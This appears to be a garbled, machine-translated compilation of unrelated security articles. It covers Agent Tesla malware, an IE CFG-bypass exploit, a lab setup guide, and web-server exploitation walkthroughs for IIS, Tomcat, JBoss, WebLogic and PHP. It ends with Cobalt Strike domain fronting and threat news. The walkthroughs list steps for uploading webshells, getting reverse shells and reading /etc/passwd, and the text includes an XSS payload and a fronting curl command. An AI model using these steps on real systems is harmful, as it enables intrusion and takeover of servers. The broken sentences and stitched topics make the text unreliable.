In late 2020, Agent Tesla attacks still tended to India, and the United States and Brazil targeted industries, in addition to previous financial services and some public units, Internet service providers (ISP) because ISP holds email or other important personal data available to gain access to other accounts and services.

This has important implications for subsequent attacks.

Sample analysis As described above, the main transmission mode of Agent Tesla is that phishing mail —— attackers usually use social engineering to deliver attractive messages, documents, or compression packages to their targets.

In the past few months, we have observed a large number of attackers spreading the Agent Tesla Trojan horse on the COVID-19 theme of "COVID-19" or "2019-nCov".

Related mail generally contains a malicious link address, or its mail attachment is a Agent Tesla malicious load, to lure the victim into clicking.

Some samples are also downloaded through macro documents or office documents with vulnerabilities.

Among them, common exploit vulnerabilities such as CVE-2017-11882, CVE-2017-8570 and CVE-2017-0199 et al.

Payload RFQ REF NS326413122017.docxCVE-2017-0199 utilizes the OFFICE OLE object link technology Microsoft HTA application to load a malicious attacker to download and perform a payload here, and we analyze a typical Agent Tesla Trojan sample.

First use a d o c download containing a CVE-2017-11882 vulnerability.

After the document runs, the vulnerability execution code is automatically triggered and the attack load is downloaded from the specified U R L using the API function URLDownloadToFileW and saved to the C:\\Users\\Public\\regasm.In the e x e file.

After opening the file, I found that the bait file content is scrambled.

The attack load first loads the resource file in the file, ostensibly a picture in png format.

In-depth analysis found that there is executed hidden code in the resource file, the Trojan will continue to run the relevant code after decrypting.

The Trojan will choose one of 3 ways to persist, including the self-boot directory, registry, and planning tasks.

Later, the Trojan continues to read from the resource file and release the real Agent Tesla main file by decryption.

The decryption function is as follows: The Trojan body will make function calls through the timer, such as using the global Hook keyboard recording: get screenshots: 8. The Trojan can be transmitted through multiple protocols.

SMTP:HTTP:FTP:9. Through the content in the SMTP related code, we were able to get the victim's email information, and the analysis found that most are honeypots and analysts of the testing environment, and of course there are also a small number of real trapped hosts.

We combine the results of other sample analysis to summarize the relevant software that will be stolen by Agent Tesla, with details as shown in the table below.

While its overall structure is simple and six years old, Agent Tesla is still one of the most popular malware available.

In recent years, after continuous update iteration, its function is constantly perfect, on the killing and analysis is increasingly complex, at the same time combining the social engineering, significantly improve the difficulty of prevention, believe that the commercial theft software will be more active, we suggest by using the following measures, related threats to detect and prevent.

Update computer security patches and software; strengthen information security awareness within employees and standardize security operation.

Carefully click on email attachments, links, etc.; it is recommended to use micro-step online threat detection platform and detect relevant threats in the first time.

After Windows 8.1, Microsoft introduced the CFG (ControlFlowGuard) mitigation technique to validated indirectly called function pointers, thereby alleviating the utilization technique of performing flow by tampering with the virtual table function pointer hijacker.

However, adversarial does not terminate, followed by new methods to bypass CFG mitigation techniques, such as address hijacking [2] by tampering with a function on the stack, and shellcode[3] in v8 with executable memory properties.

In December 2020, Microsoft added C E T mitigation technology based on IntelTiger LakeCPU to Windows10 20H1, protecting the utilization of streams by returning address hijacking programs by tampering with the function on the stack.

Therefore, how to bypass C F G in a CET-protected environment has once again become a vulnerability utilization challenge.

In analyzing [5] when CVE-2021-26411 utilizes samples in the wild, we found a novel method to bypass C F G using WindowsRPC (Remote Procedure Call), which does not rely on the ROP strand by constructing RPC_MESSAGE and invoking rpcrt4! NdrServerCall2 enables arbitrary code execution.

CVE-2021-26411 reviewed the article IE Browser in Wild 0day:CVE-2021-26411 Analysis describing the root cause of the vulnerability: removeAttributeNode() triggers the valueOf callback for the attribute object nodeValue, which manually calls clearAttributes() during the callback, causing the B S T R saved by nodeValue to be released in advance.

After the callback returns, the nodeValue was not checked to continue using the object, eventually resulting in the UAF.

The vulnerability fix in the Windows patch in March is to add index checks before removing the object operation in the CAttrArray::Destroy function: For such a controllable UAF vulnerability, the idea is to use two different types of pointers (BSTR and Dictionary.items) Point to the empty memory, and realize pointer leakage and pointer solution reference through type confusion: 2. RPC principle and utilization method Windows RPC is used to solve the distributed client / service-side function call problem.

Based on the RPC, the client can call the service side function like the local function. The RPC basic architecture is as follows: the client / service side program passes the call parameter / return value to the lower Stub function. The Stub function is responsible for packaging the data into the NDR (Network Data Representation) format, and finally communicates through the runtime library provided by rpcrt4.dll.

Here is an example idl: When the client calls the add function, the service side by the rpcrt4.dll accepts the processing request and calls the rpcrt4! NdrServerCall2:rpcrt4! NdrServerCall2 has only one parameter, PRPC_MESSAGE,, which contains important data such as the function index and parameter transfer data called by the client. The service-side RPC_MESSAGE structure and the main subdata structure are shown in the figure below.

Where Buffer stores the transfer of the function, RpcInterfaceInformation points to the RPC_SERVER_INTERFACE structure.

The RPC_SERVER_INTERFACE structure saves the service-side program interface information, where the + 0x2c DispatchTable saves the interface function pointer for the runtime library and the Stub function, and the + 0x3c InterpreterInfo points to the MIDL_SERVER_INFO structure.

The MIDL_SERVER_INFO structure saves the service-side IDL interface information, where DispatchTable saves the array of function pointers for the remote call cases provided by the server.

Therefore, replacing the MIDL_SERVER_INFO. will need to be consideredHow to bypass the C F G protection here after the DispatchTable function pointer.

First solve the problem 1: How to call rpcrt4! NdrServerCall2 via js script Here can multiplplex replace the D O M object virtual table function pointer hijacking method to execute the stream because of rpcrt4! NdrServerCall2 is a legal pointer recorded in CFGBitmap, so you can still pass CFG after replacement.

Samples were by tampering with the MSHTML!The CAttribute::normalize, is eventually powered by the " xyz.The normalize() " calls the rpcrt4! NdrServerCall2.

Sample writes shellcode to msi.Location of dll + 0x5000, eventually via rpcrt4! NdrServerCall2 calls shellcode: for the final full demonstration of utilization: Some thinking CVE-2021-26411 presents this innovative way to use RPC to bypass CFG mitigation technology in wild samples.

This utilization method needs not constructing ROP chain, and can realize arbitrary code execution directly by forging RPC_MESSAGE. It is simple and stable. There is reason to believe that the method will become a new effective utilization technique to bypass CFG mitigation measures.

Passion fruit 2.0 is actually a virtual machine. The core function and the version 1.0 platform are designed to realize the network environment shown in the local simulation below. On this basis, users can design all kinds of network security attack scenarios to learn to verify all kinds of network security technologies, especially intranet security-related technologies.

In The figure above, there are nine network devices, including three routers and six firewalls. The passion fruit 2.0 virtual machine uses docker technology and completes the network configuration and access control rules according to the graph topology.

Access control rules between regions such as PC and intelligent terminals connected to the daily office.

Attack area can access the Internet attack area and Internet area, Internet attack area can only access the Internet area attack target: the default access control rules are as follows: the default access control rules can meet the needs of a variety of attack scenarios, the default access control rules can be modified by configuration firewall equipment, we will introduce the advance in passion fruit 2.0 default port mapping.

The headquarters DMZ zone default maps 10 ports 10.10.13.100 and 10.10.13.2008000 ports 10.10.9000 to the Outnet IP(66.28.5.2).

The branch server area by default mapped ports 80 of 10.10.19.100 and 10.10.10.2008000 of 10.10. -9000 to the Outnet IP(66.28.7.2).

Next, Douge teaches you how to use the platform. First of all, you need to install VMware Workstation software (I believe you have security). The platform is made based on the VMware14.0 version. If your version is lower than 14.0, you need to be upgraded.

After the VMware installation, you can download the virtual machine compression package of the platform through the link at the end of the article, decompression to any folder and double-click the passion fruit sand table (Docker version).The vmx opens the virtual machine file to confirm that the configuration is as follows: If the configuration does not match the above, it may be a wrong downloaded file (mainly the network adapter part), it is recommended to download again.

After confirming that the configuration is correct, you can click to open the virtual machine, but it is strongly recommended to restore the snapshot before the first boot, which can avoid many strange problems.

If you pop up and ask whether to copy or move the virtual machine, be sure to choose that I have moved the virtual machine, otherwise there may be problems.

After the successful boot, enter the account password to login, user name: password: * * By default, as long as the platform virtual machine starts to complete the sand table platform will automatically complete the configuration, which can be used without other operations.

Because the platform virtual machine loaded a lot of configuration by default, VMware console after a short period of time, such as card in the following interface and the console cannot input command, this situation will not affect the platform use, ignore: if you need to manage the platform virtual machine, can use the remote SSH access: first to find the corresponding network adapter, the address to 1.1.1.1, mask 255.255.255.0, gateway blank.

You can then use the address 1.1.1.100 of the SSH connection platform virtual machine for remote management.

After the start of the sand table is completed, 8 accessible areas are provided. You only need to connect to the network environment to the virtual network of the corresponding virtual network and configure the address of the sand table.

After the virtual machine is started, the network card is configured as the address of the 192.168.2.0/24 or to obtain the address through the DHCP, and you can access the network environment of the sand table.

Special note: The passion fruit platform only provides the default network environment, and all the attack machines and target machines need the user to prepare the virtual machine and bridge the network card to the corresponding VMnet.

Because a VMware virtual machine can only create 10 network cards limit, so the passion fruit 2.0 sand table only the above 8 networks can have access to the local virtual machine, and other networks can temporarily not access to the virtual machine.

Except that the first address of each network segment is the gateway, the last address of each network segment (x.x.x.254) Also reserved address, not available assigned to access virtual machines that would otherwise cause a platform exception.

In the advanced section, we will teach you how to use the container brought with the container management platform to create a docker container as a target or attack machine, which can effectively save resources and have access to any network location in the map.

After understanding the basic use mode, we can try to build a simple attack and defense scene as shown in the figure below: this scene is a classic attack and defense scene, the attacker himself uses the attack computer (WIN7) in the attack area, access the Internet through NAT, deployed a cloud host with an Internet address (kali linux) in the Internet attack area, the target is a WEB server in the branch server area (Intranet), the WEB server maps 80 ports open on the Internet.

Building the above scene by using the passion fruit 2.0 sand table platform only needs to prepare three virtual machines, and then connect to the virtual network in the corresponding area and configure the network address well.

Special note: the following three virtual machines need to be prepared by themselves, can meet the scene described can, not must be these three systems.

Target machine configuration virtual machine network card bridge to VMnet19 configuration network card address 10.10.19.100/24 gateway 10.10.19.1 effect test: attack computer address access situation: access to cloud host: access target machine WEB service: cloud host access target machine WEB service: target machine itself WEB service: access to cloud host: after test can be found to meet the requirements of the attack scene, if you want to build a more complex attack scene only refer to the above ideas to the virtual machine to the corresponding virtual network and configure the address, is it very convenient.

How to determine if the platform is starting properly.

Use the SSH link 1.1.1.100 to see if the virtual machine is starting properly.

Use the browser to access 1.1.1.100:9000 to see if the container management platform, see if docker containers are running, if there is a container in stop state, check the container and click Start to see if you can start the container.

You can also try to use the browser to access the 80 ports of the administrative address corresponding to the nine devices in the topology, to view the status of the firewall device, and the specific use of the firewall will be detailed in the next article.

The processor of this virtual machine supports different functions than the processor of the virtual machine that maintains the virtual machine state.

The platform has a built-in original snapshot, which can start normally after the snapshot restore. If you play with it, you can also follow this.

What if a virtual machine cannot select some networks when it chooses to bridge?

By default, VMnet1-VMnet19 is optional and does not need to do any configuration. If you find that some networks can not be selected generally because it is deleted, you can click Edit-> virtual network editor for network configuration, and click Add Network.

Select the corresponding network and click OK.

After generating the network, set the VMnet information to host-only mode, and remove the two check boxes, and click OK.

Special Note: Opening the VMware Virtual Network Editor by default will see only the three VMnet0, VMnet1, VMnet8 networks. If other networks are opened using passion fruit version 1.0 or other scenarios, it is recommended that you link the host virtual adapter to this network and assign the I P address to the virtual machine using the local DHCP service in these redundant network configurations, which may cause address conflicts or DHCP conflicts.

If you want to use the subnetwork address setting with the same of the planning of passion fruit platform, and configure the local network card address cannot conflict with the address within the platform.

Originally an optional package for the Windows NT version, later built in with Windows 2000, Windows XP Professional and Windows Server 2003, there was no I I S on the Windows XP Home version.

The IIS is a Web service component that includes a Web server, an FTP server, an NNTP server, and an SMTP server, respectively, for web browsing, file transfer, news services, and mail delivery, making it easy to publish information on the web.

The security vulnerability of IIS has long been criticized by the industry, and the threat of remote execution vulnerability in IIS will be very serious.

The remote execution code vulnerability exists in the HTTP Protocol stack (HTTP.In the sys), and when the HTTP.This vulnerability is caused when the sys does not correctly analyze a specially designed HTTP request.

An attacker who has successfully exploited this vulnerability can execute any code in the context of the system account and can cause the machine blue screen where the IIS server is located or to read confidential data in its memory.

IIS Server opens Web DAV, in the W e b Service extension with the permissions to write, causing any file upload.

This vulnerability can only determine the first six characters, and it is difficult to guess if the latter characters are too long and contain special characters.

Guess it if the file name itself is too short.

If the top 6 bits of the file name are filled with space, the short file name in 8.3 format does not match the real file name.

Remote code execution When handling the PROPFIND instructions, because the length of the url is not effectively controlled and checked, the construction of the virtual path, causing the remote code execution.

The vulnerability environment is built and installed on the windows server 2003 r2 32 bit.

Trigger vulnerability in local exp,exp successful success, server-side popup calculator.

Logical errors occur when processing file paths with special symbols, causing a file resolution vulnerability.

There are two completely different ways to exploit the first is a new one called " test.Directory of asp ", where any files are executed by IIS as an asp program.

The second is the upload called " test.asp;.The file of jpg ", although the real suffix name of the file is".The jpg ", but because of the special symbol"; ", IIS as a s p program execute IIS7.5 file resolution vulnerability URL file suffix is.For php, the file is present directly to php, and php opens "c g i" by default.fix_pathinfo "," repairs " the file.

If there is a file, test.The jpg, accessed later after /.By php, you can put the " test.jpg/.Give php "to php,php repair file path" test.jpg/.The php "get" test.jpg", the file exists and performs it as a php program.

Filtering the new directory file name does not allow the new ones to include '.'File.

The function of building a new directory in the curve website background, and building a new directory is not allowed.

Limit the uploaded script execution permissions and do not allow script execution.

filter.asp/xm.The jpg, was filtered by the ISApi component.

It can run on almost all widely used computer platforms, and is one of the most popular Web server-side software due to its widespread cross-platform and security usage.

It is fast, reliable and expanded with simple API to compile interpreters like Perl/ Python into the server.

The Apache file parsing vulnerability involves the feature of a parsing file: Apache default a file can have multiple point-separated suffixes, when the right suffix is not recognized, continue to the left, when we request such a file: shell.xxx.yyyphp-> found that the suffix is php and given to php to handle this file.

Upload a p h p file with a suffix named 3603, the vulnerability fix will be AddHandler application/x-httpd-php.Profile deletion for php.

It is characterized by less memory and strong concurrency ability. In fact, nginx does perform well in the same type of web server (2) file resolution 1, vulnerability introduction and cause to any file name, add / any file name later.Parsing vulnerability for php such as the original filenname is test.The jpg, you can add test.jpg/x.The php performs a parsing attack.

The HTTP Header is separated by two C R L F's from the HTTP Body, and the browser removes the H T T P content according to the two CRLF's and displays it.

By controlling the characters in the HTTP message header and injecting some malicious change rows you can inject some session cookie or html code and the injection code is executed because Nginx is not configured correctly.

Vulnerability resume access page, packet request plus /%0d%0a%0d%0a <img src=1 onerror=alert (/ xss /)> There is no pop-up due to page redirection.

Nginx profile / etc/nginx/conf. for vulnerability fixThe d/error1.conf is modified to use the undecoded url jump.

The Tomcat Server is a free open source Web application server that belongs to a lightweight application server, is commonly used in small and medium-sized systems and concurrent access users for not many occasions, and is the preferred choice for the development and debugging of JSP programs.

For a beginner, it can be thought that when the Apache server is configured on a machine, it can be used to respond to access requests from the HTML page.

The Tomcat is actually an extension of the Apache server but runtime it s running standalone so when running the tomcat it actually runs separately as a process separate from the Apache.

The Tomcat runs on the Windows host and enables the HTTP PUT request method that can upload JSP files containing arbitrary code to the server via the constructed attack request, causing arbitrary code execution.

Turn on the put method to upload the file function.

The / conf/web. s under the tomcat folderThe xml file insert: Restart the tomcat service.

Visit 127.0.0.1:8080, burp grab the package, send to Repeater, changes the request mode to PUT, create a 122.jsp, and escape the space characters with%20.

Visit the 127.0.0.1:8080/122.jsp?cmd=calc 。

Tomcat supports deploying war files in the background, and you can deploy webshell directly to the web directory.

If there is a weak password present on the background management page, you can get the password through blasting.

The tomcat-users. in the c o n f under the Tomcat installation directoryThe xml configuration is as follows: access the background, login: upload a war package, which is the jsp backdoor: successfully upload and resolve, open: executable system command: can also conduct file management, arbitrary view, delete, upload files.

Run the Tomcat application with low permission on the system.

Create a dedicated Tomcat service user that has only a minimum set of permissions (for example, remote login is not allowed).

Increase local and certificate-based authentication (directory services are also configured for centralized authentication).

In the CATALINA_HOME/conf/web.The xml file sets the locking mechanism and the time timeout limit.

And set minimum access limits for directory pages such as manager-gui/manager-status/manager-script.

Background management avoids weak passwords.

The jBoss is an application server based on J2EE for developing the source code.

The JBoss code follows the LGPL license and is freely available in any commercial application.

JBoss is a container and server that manages EJB and supports both EJB1.1, EJB 2.0 and EJB3 specifications.

But the JBoss core service does not include W E B containers supporting servlet/JSP and is generally used with Tomcat or Jetty binding.

Java serialization is, in short, the process of converting java objects into a byte sequence.

Antisequence is the process of restoring the byte sequence to a java object, but when this turn becomes changed, the programmer's filtering is not strict, which can lead to the implementation of the maliciously constructed code.

Attack Machine Access Target Machine Service: Access / invoker/readonly.

Return 500, indicating that the page exists, this page has deserserialization vulnerability: package: change package.

POST payload.Data in the bin.

View the target machine, pop up the calculator.

Effective Solution: Upgrade to the JBOSS AS7 version of the Temporary Solution: 1) No http-invoker. is requiredUsers of the sar component can directly remove this component; 2) for access control of the httpinvoker component.

Weak password in the jBoss background management page exists, and the account password is obtained through blasting.

Log in to the background to upload the war package containing the backdoor.

Click on the Web Application (war) s.

Click on the add a new resource.

Select a war package to upload, after upload, enter that war package and click start.

View the status for the sucessful.

Visit the war package page and enter the back door.

File management and system command execution are available.

WebLogic is a applicationserver, from Oracle that is exactly a JAVAEE architecture-based middleware, a J a v a application server to develop, integrate, deploy, and manage large distributed Web applications, web applications, and database applications.

Introduce Java dynamics and the security of Java Enterprise standards into the development, integration, deployment, and management of large network applications.

Using the vulhub experimental environment, start the experimental environment, access the target machine, grab the packets, and modify the packets.

Kali starts the listening.

After sending the packet successfully, get the shell.

Upgrade the Oracle 10 month patch.

Access control over the resources that access the wls-wsat.

There is an S S R F vulnerability in Weblogic that allows you to send any HTTP requests and then attack vulnerable components such as redis, fastcgi in the innet.

Using the vulhub experimental environment, the the environment.

Visit the http://192.168.139.129:7001/uddiexplorer/SearchPublicRegistries.jsp 。

Grab the package with burp and modify the request.

Start nc listening for port 2222.

Get the shell.

The direct way to fix it is to put the SearchPublicRegistries.Remove the jsp directly.

Method 2:1) Remove the uddiexplorer folder 2) Limit uddiexplorer applications to Intranet access.

Method 3: (commonly used) The Weblogic service-side request forgery vulnerability appears in the uddi component (so if you did not select the u d d i component when Weblogic was installed), more precisely the u u d i package implementation package uddiexplorer.The SearchPublicRegistries. under the warjsp 。

Install the wlserver_10.3/server/lib/uddiexplorer. in the weblogic installation directoryThe war makes the backup well.

Install the server/lib/uddiexplorer. in the weblogic installation directorywar download.

Open the uddiexplorer. with tools such as winrarwar 。

Under its SearchPublicRegistries.The jsp was renamed to the SearchPublicRegistries.jspx 。

Save it and upload it back to the service side to replace the original uddiexplorer.war 。

For clusters of multiple hosts, do this for each host.

Since there is a cache in the t m p directory of each server, completely restart weblogic (i. e. stop application- -stop server--stop console-start server--console).

By accessing the config.The do configuration page, change the Work Home working directory first, replace the default directory that stores the JKS Keystores files with a valid deployed Web application directory, and then use the "Add Keystore Settings" feature to upload malicious JSP script files.

Then click on Security-> Add and then upload webshell, here I upload a jsp pony.

After uploading, view the returned packet with a timestamp: you can see that the timestamp is 1543145154632.

Visit the http://192.168.139.129:7001/ws_utc/css/config/keystore/1543145154632_lele.jsp 。

File management, file upload, system command execution, etc.

Try the following to execute the system command.

The command was executed successfully.

Because there is a weak password in the WebLogic background, you can directly enter the background to upload the war package containing the backdoor.

Access http://192.168.139.129:7001/console to login to the background with a weak password.

Click on Lock and Edit.

Select Deployment and click further on the right.

Click Upload File- -enter the file upload interface and select the war package to upload.

Go to the next step, select the corresponding war package for deployment, and the next step until completion.

Click to Activate the Change.

Start the service generated by the uploaded war package.

Get the webshell.

Firewall settings port filtering, you can also set an IP list that only access the background to avoid weak passwords in the background.
Using the vulhub experimental environment, the experimental environment was initiated.

Use the command python fpm. in the attack machineThe py 192.168.237.136 /etc/passwd, observations return the results.

Due to access to the non- *.PHP file, so returns the result 403.

Use the command to execute a php file that exists by default.

Use command with arbitrary commands.

PHPCGI Remote code execution 1, vulnerability profile and causes explained in apache call php interpreter.In the php file I pass the url parameter to the php interpreter and if passing the command line switch (such as-s, -d, -c or-dauto_prepend_file%3d/etc/passwd + -n after url) causes source cod e leakage and arbitrary code execution.

This vulnerability affects previous versions of php-5.3.12, mod, fpm, is unaffected.

The vulnerability reuse uses the vulhub experimental environment to start the environment.

Visit the http://192.168.139.129:8080/index.php 。

Grab the packages, and modify the packages.

The command was executed successfully.

This article combs out and displays its shared content.

The following is Liu Zhicheng's live sharing record: In the actual business scene, you will find that you will pay more and more attention to the business after achieving a certain degree of security.

Data security is the most directly related to the business, and the security focus is to protect the data.

After doing data security, gradually consider how to do business security, what is the relationship between it and the traditional business risk control?How are the data classified?We are concerned about the introduction of standards and industry standards, as well as our own practical experience.

Data Classification If you are in the Internet industry, your biggest focus should be on personal sensitive data.

Because there is a growing demand for national regulation and personal privacy protection.

Public security, communication administration bureau and other departments are all concerned about APP security, data collection and authority management, which are all related to personal data.

The second is the business data, and if you are a traditional business, you may focus on the business data itself.
The third is business data, some of our traditional data security solutions, which focus on solving some of this problem.

Many people talk about the lifecycle management of data, such as collection, transmission, storage, processing, use, sharing, and disposal.

One thing you may ignore is the convergence link.

If you are an Internet business, then convergence is a very critical issue.

For example, you have a lot of business in storing data, especially personally sensitive data, in decentralized or centralized storage; how to handle sensitive data calls and API interfaces?How do we keep the whole data secure?From the perspective of technical means, the first is the compliance requirements, which depends on whether the data collection and protection is compliant.

In addition, with testing and monitoring capabilities, can you detect data risks?The purpose of monitoring is to give early warning, you need to truly grasp the panoramic view of data security, to understand where the risks are and how the governance effect is.

Audit and investigations are also involved.

In the traditional data lifecycle, we all process data internally, but now in the Internet business environment, data is not only internal, because you'll have partners.

Take e-commerce as an example, the data interaction between all merchants and logistics involves user data sharing.

How to ensure the security in the sharing process of data?How to ensure that all partners do not have problems with data security, but to consider monitoring the interface and data sharing and processing process in real time with technical means.

To take another example, the Internet business has SMS verification code login or SMS business reminder service, in this link your SMS provider faces a major risk, you can guarantee that your data will not leak, but you cannot guarantee that your partner.

So the ability to review the partners is also very important.

In addition to the audits, there are also investigations.

After the data leakage, how to trace the source, trace it, and how to monitor the source of the problem needs to be investigated.

Audit investigations are designed to form a closed loop, can get systematic conclusions, and better present the data security effect.

With these links, a data security system.

To sum up, we say that data security, in addition to the usual standards and best practices, but also need to pay attention to collection compliance, transmission and storage convergence encryption, sharing control, risk monitoring, partner access and audit mechanism.

How to make business security do?What are the assets we focus around in our business security?Mainly focus on two points, one is the account number, the other is trading.

The transaction includes all business actions and actions.

Business security is important to focus on loopholes, loopholes in assets are actually fraud, fraud will bring account and transaction risks, fraud mainly comes from black and gray production.

The first thing we focus on security is risk governance. After risk is defined, what should we do about business security?How can the risk be detected?This requires a dynamic monitoring mechanism to monitor business security problems, which can deal with and report on business security problems, and can systematically show the actual level of business security.

In addition to these measures, we have a complete mechanism and a team to deal with these business security issues, methodological guidance, tools and platforms, processes and operational systems to support you to do this well.

Risk identification, handling measures and management system can constitute a complete business security.

In the business security, the account security of the Internet business, the first is the identity problem, such as the ID card number, mobile phone number, face recognition, which is the key feature to judge whether the user is a real user.

The second is the user environment, such as the IP address, geographic location information, and whether the user access business terminal is pp or a browser.

There are also user behavior, access time, access frequency.

These are we consider from the account security perspective, to establish through these characteristics of the identification model, can detect and monitor fraudulent user access business, and do the corresponding security processing.

Transaction security in this area, we are concerned about the business logic issue.

Is your business behavior itself generated by a real user account, rather than some robot access, what is the user's access path, and what are the terminal environment and access methods.

Now our business systems are all micro-service interface mode. In the process of access, whether users target an interface or a business logic interface mode, this is actually some key parameters that we should pay attention to.

In addition, pay attention to the account is stolen, it is the focus of transaction security.

So we say that business security needs to be made into an in-depth defense system, and we need to have the following points.

The first is the early warning ability. When the business risk or account and transaction fraud enters the system, you should have the ability to give an early warning.

The warning comes from your detection and monitoring capabilities, and it relies on the intelligence system.

For example, mobile phone numbers, which are controlled by black and gray production, are these numbers themselves at risk?There are also the tags and features of the IP address.

These third-party intelligence provide your basis for detection and monitoring capabilities for early warning.

Of course, you will also collect the corresponding data through your detection and monitoring capabilities to improve the quality of intelligence.

This will involve internal correlation analysis, and then do the corresponding visualization, can reflect the security of your whole business technology system.

The second is the disposal capacity.

What we need is real-time processing capabilities, including several processing capabilities: the first is to block, through the previous analysis can detect high-risk behavior users in time, so that we can directly turn it away.

The second is the business honey pot, so that users in the monitored environment, we can analyze the user behavior and account number, to provide information for the whole business security.

The third is the means and methods for us to enhance the verification.

We can add face recognition in the business link to ensure the authenticity of users.

This is a different approach depending on the level of risk you judge.

Why in the business security system in real time?The question actually comes from how much real business traffic there is.

From the perspective of traffic analysis, the first level is the firewall, ids, ips can block a batch of malicious traffic from the network layer, this step we will deal with more attack traffic.

The second level is the WAF layer, this batch of traffic is some common cross-station, SQL injection and other external application security risk block.

The third level is the traffic generated by non-system users. Whether it is black and gray industry-controlled users or fake and fraudulent users, they want to enter our business system, but they can not generate business value, so we also want to block this part of the traffic.

From our empirical analysis, about 3% of the traffic is the business security risk traffic, it is not the traffic generated by the real users, but it is generated within our business system.

It may not generate any business value other than your performance and system loss, especially for major promotions.

So that's why we mention business security.

All of that has just said.

What does an early warning need?Need data sources, which comes from your intelligence system, monitoring capabilities, and analysis capabilities.

In the disposal link, when you can't fully judge that it is a high risk, for example, when you only have a 50% grasp, you can increase the business layer verification mechanism, such as by brushing the face to raise its threshold.

If you have a 70% or 80% grasp, you can let him run the whole business process in the sandbox, the honey pot, observe his behavior characteristics and the actual business transaction characteristics, and then make an accurate judgment.

100% judge the accounts controlled, or non-business users, we can directly block.

How to balance data security and business security?In the process of business, the business department and the security department may have different views on whether it is safe traffic.

The business department may want the more users, and he doesn's not necessarily focus on whether they bring business value.

However, the security department needs to provide early warning and judgment ability, and the risk decisions are made by the decision-makers.

Back to the theme of data security, you will find that security also requires data, whether detection, monitoring or acquisition, to deal with user data.

From the perspective of user data, the first is that laws and regulations will be more and more strict data protection. For example, obtaining personal data needs to inform users and users of authorization.

It is also relatively difficult to get the right to know and consent of the black and gray production control account.

The second is minimum availability, and user data acquisition should follow the principle of minimum availability.

The third is to revoke at any time, even if you collect the user data, but when the user revoke the authorization, you need to remove the data.

In addition to having the power to delete, users also have the power to transfer and correct it.

These rights are double-edged swords that can also have business and security implications while protecting users.

From a business security perspective, we need to identify counterfeiting, forgery, deception, tampering, and automate attacks.

It is related to user data, such as account security data including ID number, mobile phone number, terminal, identification location, time and frequency of transaction behavior, etc.

How to balance the security of user data and business.

Use harmless domain names in the explicit DNS request and TLS Server Name indication (SNI) to initialize the connection, publish to the reviewer, while the actual blocked domain name to be connected is issued only after creating an encrypted HTTPS connection, being not explicitly exposed to the network reviewer.

The most basic implementation code is curl-v https://fastly.net -H "Host: cn.nytimes.The com " can see the sni vs. host difference.

Similarly, in the traffic behavior, we can also see the sni, namely the server_name field.

At this point from the traffic monitoring side to see that we are just working with the https://fastly.The net performs the communication behavior.

Only the server request will see our real host is cn.nytimes.The com, then go to its corresponding source station to pull information.

The reason why such behaviors can interact normally is because of fastly.The net and the cn.nytimes.The com is connected to the same CDN manufacturer, and the return source is returned according to the http header host.

Domestic "domain front" to read a lot of articles.

The "domain front" is this: just access the IP ping of CNAME and fill in the CS IP.

Modify the profile file again, and then specify the host as a host.

Not if http is up domain front.

If we follow this idea, we should actually write this: (CDNIP and domain name are my messy writing, cloudflare no longer supports the domain front) because the 4.x version of CS already supports assigning http/https host header directly when building a new listener.

And the field has a higher priority than that specified in the profile.

So why do we still modify the profile file every time?And the http/https Host stager is used for a secondary download load, consistent with the properties of the hosts.

Someone else's domain name is not parsed to the above IP or with the same CDN as you use.

Can writing directly about someone else's domain name really issue a load normally?Therefore, I personally think this can not be counted as a domain front, but can only be counted as "CDN illegal access", because China's policy requires that domestic CDN access must be recorded, so if you choose this way, you can not use domestic CDN if it is put on record.

You can also set back the source h o s t field on the CDN, or you can be set to a registered domain name.The "CDN illegal access" traffic feature does not discuss http related content here, look directly at https.

According to the "CDN illegal access" approach, we can easily catch him.

The Trojan generated by CS s s l shakes with content filled out in https hosts, https host (stager).

So the situation is similar to this: (here I take Tencent Cloud as an example) and it is obvious from the traffic that there is no server_name field for direct access to https://ip.

So the access is the default certificate.

that is *.cdn.myqcloud.The com can be used here as an important feature.

The https request sent is not server_name and the certificate accepted is the CDN default certificate.

domain front domestic realization of "CDN illegal access", further configuration can realize the real sense of the domain front.

We need to know which domain domains are parsed on the CDN.

You can use VT, microstep and other platforms to query.

You can then test to send a https request and then get a request containing servername with a normal handshake.

In CS, we just configure this: we can complete the real "domain front".

But the drawbacks are also exposed.

Unnecessary DNS requests will arise.

How to ban the domain front?This is in the perspective of CDN manufacturers, there are several parts to do.

1. bans the empty server_name handshake this can be well implemented.

Using the cloudflare approach, the default certificate is directly configured correctly.

For example I do the following configuration in n g i n x: The ssl_protocols TLSv1.1 TLSv1.2;ssl_ciphers MD5;md5 algorithm is only available in TLSv1.3, so the handshake fails at this time.

2. banned server_name from host this temporarily unclear specific implementation.

3. strengthens CNAME verification. Many CDN manufacturers are already doing it.

Illegal access can be banned, but after access to their own legal domain name can still use the domain front.

So the focus is still 1.2 in two parts.

But if this strengthens, the attacker will have to use their own domain name, increasing the likelihood of traceability.

The new Android Bank Trojan TeaBot has attacked more than 60 European bank hackers and launched a phishing attack on UnionBank

Washington, D. C. Police Department ransomware attack follow-up: Police Department sensitive data leaked in Tulsa, resulting in online service interruption.

U. S. defense contractor BlueForce was hit by Conti ransomware.

The UK Water Authority (Ofwat) has received more than 20,000 malicious emails this year.

DarkSide claims to attack three more companies' industrial control threat intelligence Siemens "patch" announcement solved 60 vulnerabilities caused by third-party components.

The Lemon Duck botnet is attacking activities using the Microsoft Exchange service.

Hackers use Avaddon ransomware to attack Australia.

Threat organizations that exploit Rootkit malware.

The Lazarus organization has launched attacks against Japan.

The attacker disguised TeaBot as a decoy program like DHL, UPS, VLC MediaPlayer and Mobdro for delivery, and once the malware, the target group is downloaded, will try to install as a "Android service" for lasting operation, and TeaBot has already begun to communicate with its C2 server in the background.

After installation, TeaBot will request the device's "observe the user actions", "retrieve the window content", and "execute any gesture" permission, and then delete its own icon on the device, to achieve the purpose of hiding itself and avoiding detection.

Once successfully installed, TeaBot will have additional permissions: malware to send / intercept SMS messages; read address books and communication status; modify audio settings using device-enabled biometric methods (such as mute the device); display a pop-up on top of all other applications (used to force users to accept access services during the installation phase); remove installed applications; and abuse the Android accessibility service.

The malware has keyboards, screenshots, overlay attacks, multilingual support, and common features of other well-known bank trojans.

The researchers also said that the malware was found mainly against Spanish banks in January 2021, and banks in Germany and Italy were their main targets in March, and more than 60 banks in Europe have been attacked from TeaBot malware.

The hacker copies the user of an email about the login attempt, inducing the victim to click the Reset password button, open the browser and redirect the user to the phishing page, the same as the real UnionBank online banking page.

